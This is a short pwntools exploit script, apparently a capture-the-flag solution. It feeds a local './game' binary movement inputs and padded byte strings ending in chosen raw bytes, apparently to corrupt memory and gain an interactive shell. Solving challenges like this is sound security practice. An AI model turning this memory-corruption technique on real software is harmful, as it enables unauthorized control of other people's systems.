#!/usr/bin/env python3
from pwn import *

s = b'aaaa'+b'a'*4+b'wwwws'

conn = process(["./game"])
for i in range(3):
    conn.sendline(s)
    conn.sendline(b'p')
conn.sendline(s)
conn.sendline(b'a'*47+b'l\x70'+b'ws')
conn.sendline(s)
conn.sendline(b'wws')
conn.sendline(b'a'*47+b'l\xfe'+b'w')
conn.interactive()

